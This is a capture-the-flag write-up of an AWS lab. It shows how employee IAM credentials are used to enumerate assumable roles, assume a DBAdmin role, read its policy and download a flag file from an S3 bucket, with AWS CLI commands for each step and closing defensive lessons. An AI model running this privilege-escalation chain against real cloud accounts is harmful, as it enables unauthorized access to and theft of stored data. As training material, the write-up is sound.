# AWS Red Team - IAM Role Assumption & S3 Flag Retrieval

## Challenge Overview

Welcome to Secure Corp, a leading organization with a growing cloud infrastructure.

Recently, a security audit raised concerns about potential misconfigurations in IAM roles and permissions. As a Red Team Specialist, the objective is to investigate IAM permissions, identify vulnerabilities in role trust relationships, escalate privileges, and retrieve the hidden flag stored inside an S3 bucket.

## Initial Access

The challenge provides AWS credentials of an employee IAM user.

Available credentials:

* AWS Access Key ID
* AWS Secret Access Key

The objective is to:

1. Configure AWS CLI.
2. Investigate IAM permissions.
3. Identify misconfigured IAM roles.
4. Assume a privileged role.
5. Access the protected S3 bucket.
6. Retrieve the final flag.

## AWS Resources

The environment contains:

* IAM Users
* IAM Roles
* IAM Policies
* S3 Buckets

---

# Solution

## Step 1 - Configure AWS CLI

First, configure AWS CLI using the provided credentials.

```bash
aws configure --profile IAM01
```

Verify the current identity:

```bash
aws sts get-caller-identity --profile IAM01
```

Example output:

```json
{
    "UserId": "AIDA...",
    "Account": "058264439561",
    "Arn": "arn:aws:iam::058264439561:user/Backend_Developer"
}
```

This confirms that we are authenticated as an IAM user.

---

# Step 2 - Enumerate Possible IAM Roles

The next objective is to discover roles that can be assumed by the current user.

## Method 1 - Using Assume Role Enumeration Tool

A role enumeration tool can be used to identify assumable roles.

Example:

```bash
python assume_role_enum.py --account-id ACCOUNT-ID --profile IAM01
```

The tool attempts different role names and identifies roles where:

```
sts:AssumeRole
```

is allowed.

---

## Method 2 - Manual Role Assumption

If a possible role name is known, manually test it:

```bash
aws sts assume-role --role-arn arn:aws:iam::ACCOUNT-ID:role/ROLE-NAME --role-session-name test --profile IAM01
```

Successful execution returns temporary credentials:

* AccessKeyId
* SecretAccessKey
* SessionToken

Example:

```
arn:aws:sts::058264439561:assumed-role/DBAdmin/test
```

The current user has successfully assumed the DBAdmin role.

---

# Step 3 - Configure Temporary Role Credentials

The returned temporary credentials must be configured.

```bash
aws configure set aws_access_key_id TEMP_ACCESS_KEY --profile Role

aws configure set aws_secret_access_key TEMP_SECRET_KEY --profile Role

aws configure set aws_session_token TEMP_SESSION_TOKEN --profile Role
```

Verify the assumed identity:

```bash
aws sts get-caller-identity --profile Role
```

Expected result:

```
arn:aws:sts::ACCOUNT-ID:assumed-role/DBAdmin/test
```

---

# Step 4 - Enumerate Role Permissions

Now investigate the permissions attached to the assumed role.

List attached policies:

```bash
aws iam list-attached-role-policies \
--role-name DBAdmin \
--profile Role
```

The attached policy was identified:

```
Manager_Access_S3
```

---

Retrieve the policy content:

```bash
aws iam get-policy-version \
--policy-arn arn:aws:iam::ACCOUNT-ID:policy/Manager_Access_S3 \
--version-id v1 \
--profile Role
```

The policy revealed access to:

```json
{
    "Action": [
        "s3:GetObject",
        "s3:ListBucket"
    ],
    "Resource": [
        "arn:aws:s3:::securecorpbakstoragebuk",
        "arn:aws:s3:::securecorpbakstoragebuk/*"
    ]
}
```

This exposed the target S3 bucket:

```
securecorpbakstoragebuk
```

---

# Step 5 - Access S3 Bucket

List objects inside the bucket:

```bash
aws s3 ls s3://securecorpbakstoragebuk/ --recursive --profile Role
```

The flag file was discovered:

```
docs/Flag.txt
```

Download the file:

```bash
aws s3api get-object \
--bucket securecorpbakstoragebuk \
--key docs/Flag.txt \
flag.txt \
--profile Role
```

The retrieved file contains the final flag.

---

# Attack Path Summary

The attack chain:

```
Employee Credentials
        |
        v
AWS CLI Authentication
        |
        v
Enumerate IAM Roles
        |
        v
Find Misconfigured AssumeRole Permission
        |
        v
Assume Privileged Role (DBAdmin)
        |
        v
Enumerate Attached Policies
        |
        v
Discover S3 Permissions
        |
        v
Access Protected Bucket
        |
        v
Retrieve Flag
```

---

# Key Security Lessons

## IAM Role Trust Relationships

Improperly configured role trust policies can allow unauthorized users to assume privileged roles.

## Least Privilege

Users should only have permissions required for their tasks.

## Monitoring

CloudTrail should monitor:

* AssumeRole events
* IAM policy changes
* Unusual S3 access
* Privilege escalation attempts

---

# Challenge Recap

Successfully completed:

* AWS CLI configuration with provided credentials
* IAM role enumeration
* Privileged role assumption
* Permission enumeration
* S3 bucket discovery
* Flag retrieval

The vulnerability was caused by an overly permissive IAM role trust relationship that allowed privilege escalation.
